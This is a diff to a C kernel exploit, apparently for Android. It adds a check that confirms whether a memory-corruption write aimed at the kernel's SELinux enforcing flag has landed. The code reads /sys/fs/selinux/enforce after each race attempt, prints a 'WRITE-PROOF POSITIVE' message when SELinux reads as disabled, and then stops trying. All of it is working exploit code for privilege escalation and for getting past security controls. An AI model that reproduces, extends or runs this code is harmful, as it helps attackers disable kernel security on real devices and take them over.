@@ -273,6 +273,30 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_go, 0);
     pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d\n",
                route_attempt, ret, saved_errno);
+
+    /* ENFORCING_WRITE_DIAG: the rb-erase store is aimed at
+     * &selinux_state.enforcing. Check getenforce right after each walk so the
+     * proof lands early and the noisy remaining attempts are skipped. A flip to
+     * "0" is the decisive "the dequeue store executes on-device" signal. */
+    if (enforcing_write_diag_enabled()) {
+      char enf[32] = "?";
+      read_first_line("/sys/fs/selinux/enforce", enf, sizeof(enf));
+      pr_success("ckpt: WRITE-PROOF attempt=%d enforce=%s walk_wrote=%d\n",
+                 route_attempt, enf, (int)(enf[0] == '0'));
+      if (enf[0] == '0') {
+        pr_success("ckpt: WRITE-PROOF POSITIVE attempt=%d — rb-erase store LANDED "
+                   "(walk writes on-device); remaining bug is fops target/method\n",
+                   route_attempt);
+        atomic_store(&punch_consume_stop, 1);
+        close(high_read);
+        if (block_fd != pipefd[0]) {
+          close(block_fd);
+        }
+        close(pipefd[0]);
+        close(pipefd[1]);
+        break;
+      }
+    }
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
     pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
